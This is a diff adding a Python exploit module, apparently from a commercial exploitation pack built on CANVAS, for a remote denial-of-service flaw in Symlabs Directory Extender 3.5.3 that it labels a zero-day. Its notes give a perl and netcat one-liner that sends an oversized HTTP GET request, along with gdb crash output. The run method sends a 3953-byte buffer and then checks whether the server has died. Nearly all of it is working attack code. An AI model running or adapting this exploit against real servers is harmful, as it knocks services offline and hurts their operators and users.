@@ -1,0 +1,113 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007
+#
+
+import sys
+
+sys.path.append(".")
+sys.path.append("../../")
+
+import canvasengine
+
+from MOSDEF import mosdef as mosdef
+from exploitutils import *
+from tcpexploit import tcpexploit
+
+NAME = "Symlabs Directory Extender 3.5.3 Invalid Data Length DoS Vulnerability"
+VERSION = "0.1"
+DESCRIPTION = "[0day] Symlabs Directory Extender 3.5.3 Invalid Data Length DoS Vulnerability"
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "DoS"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["Linux"], ["Solaris"] ]
+
+NOTES = """
+If a HTTP or HTTPS listener is configured (via Java Based Interface (DS
+GUI) for example), an attacker can send a specially constructed HTTP
+request to the server to exploit DoS vulnerability. This crashes the
+server, making it unusable until it is restarted.
+
+For example with listener HTTP:
+
+( perl -e 'print "GET /"; print "A" x 3953; print " HTTP/1.0\r\n\r\n"';
+cat ) | nc -v -n 192.168.0.8 80
+
+gdb -q /opt/ds/R3.5.3/sbin/dsproxy -p 1401
+[...]
+Program received signal SIGSEGV, Segmentation fault.
+[Switching to Thread -1210570560 (LWP 6370)]
+0x0809c57f in read_decode_call_hooks ()
+(gdb) x /i $eip
+0x809c57f <read_decode_call_hooks+1663>:        movl   $0x1,0xffffffff
+"""
+
+DOCUMENTATION = {}
+DOCUMENTATION["Notes"] = NOTES
+DOCUMENTATION["Date public"] = ""
+DOCUMENTATION["CERT Advisory"] = ""
+DOCUMENTATION["CVE Name"] = ""
+DOCUMENTATION["References"] = ""
+DOCUMENTATION["Repeatability"] = ""
+DOCUMENTATION["WARNING"] = ""
+
+class theexploit (tcpexploit):
+    
+	def __init__(self):
+		tcpexploit.__init__(self)
+		self.setPort(80)
+		self.setHost("")
+		self.setVersion(1)
+		self.setInfo(DESCRIPTION)
+		self.name=NAME
+		return
+    
+	def run(self):
+		self.host = self.target.interface
+		self.port = int(self.argsDict.get("port",self.port))
+		self.size_buffer = 3953
+
+		self.log("Connecting to %s:%d"%(self.host,self.port))
+		s = self.gettcpsock()
+		try:
+			s.connect((self.host, self.port))
+		except:
+			self.log("Could not connect to %s on port %d" % (self.host, self.port))
+			return 0
+
+		buf = "GET /" + "A" * self.size_buffer + " HTTP/1.0\r\n\r\n"
+
+		try:
+			s.sendall(buf)
+		except:
+			pass
+
+		self.log("Done sending attack buffer.")
+
+		self.log("Trying to connect again.")
+
+		try:
+			s.connect((self.host, self.port))
+			self.log("We connected - it did not die - it must be patched.")
+			ret = 0
+		except: 
+			self.log("Could not connect .. good .. Symlabs Directory Extender is died.")
+			ret = 1
+			
+		self.log("Done with exploit")
+		self.setInfo("%s attacking %s:%d - done"%(NAME,self.host,self.port))
+		return ret
+
+	def usage(self):
+		print "Usage: "+sys.argv[0]+" -t target [-p port:80]"
+		sys.exit(0)
+    
+if __name__ == '__main__':
+	print "Running CANVAS %s Exploit v %s" % (DESCRIPTION,VERSION)
+	app = theexploit()
+	ret = standard_callback_commandline(app)
